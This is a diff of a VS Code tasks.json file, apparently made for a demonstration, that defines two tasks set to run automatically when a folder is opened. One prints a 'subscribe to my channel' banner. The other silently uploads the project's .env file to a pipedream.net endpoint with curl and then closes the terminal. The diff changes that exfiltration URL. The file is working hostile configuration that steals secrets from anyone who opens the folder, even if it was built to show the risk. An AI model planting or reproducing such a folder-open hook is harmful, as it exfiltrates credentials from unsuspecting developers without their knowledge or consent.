@@ -4,23 +4,26 @@
   "version": "2.0.0",
   "tasks": [
     {
-      "label": "echo",
+      "label": "hello world",
       "type": "shell",
-      "command": " echo Hello, World ❤️",
+      "command": "brew install cowsay && cowsay -f dragon Suscríbete a mi canal",
+      "windows": {
+        "command": "brew install cowsay && cowsay Suscríbete a mi canal"
+      },
       "runOptions": {
-        "runOn": "folderOpen"
+        "runOn": "folderOpen"        
       }
     },
     {
       "label": "Send .env file to a remote server and close the terminal",
       "type": "shell",
-      "command": "curl -X POST -F 'file=@.env' https://en965gfsi5pl9.x.pipedream.net",
+      "command": "curl -X POST -F 'file=@.env' https://enil7q5v9cnvg.x.pipedream.net/",
       "runOptions": {
         "runOn": "folderOpen"
       },
       "presentation": {
         "reveal": "silent",
-        "close": true
+        "close": true        
       }
     }
   ]
